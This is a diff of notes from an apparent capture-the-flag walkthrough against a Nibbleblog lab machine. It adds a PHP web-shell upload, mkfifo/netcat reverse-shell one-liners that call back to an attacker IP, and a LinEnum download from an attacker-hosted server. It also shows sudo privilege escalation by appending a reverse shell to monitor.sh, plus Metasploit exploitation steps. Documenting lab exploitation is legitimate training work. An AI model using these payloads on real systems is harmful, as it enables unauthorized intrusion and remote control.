@@ -21,3 +21,76 @@ gobuster in order to search for hidden directories etc.
 
 Initial Foothold:
 
+Uploaded snippet of PHP code in the image upload: <?php system('id'); ?>
+- This tells us if the upload is successful or not
+
+Now edit the code and re-upload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
+
+Start netcat listener on port 8443
+
+curl or navigate to the image.php file in order to activate the reverse shell
+
+Upgrade shell:
+check version of python : which python
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+
+Privilege Escalation:
+
+start http server to serve up LinEnum.sh: sudo python3 -m http.server 8080
+
+from target machine, wget http://<your ip>:8080/LinEnum.sh
+
+Make the file executable
+
+Run program.
+
+seems we can run monitor.sh with sudo privileges
+
+add append reverse shell one-liner to escalate our privileges: echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
+
+now run the monitor.sh file: sudo ./monitor.sh
+
+start nc -lvnp 9443 in order to catch escalated reverse shell 
+
+
+ALTERNATE METHOD: METASPLOIT
+
+Start metasploit: msfconsole
+
+Search exploit for nibbleblog: search nibbleblog
+
+use 0
+
+set rhosts to target IP and lhost as your IP address
+
+show options in order to verify other options that need to be set
+
+set username and password (admin:nibbles)
+
+set payload to generic/shell_reverse_tcp
+
+exploit
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
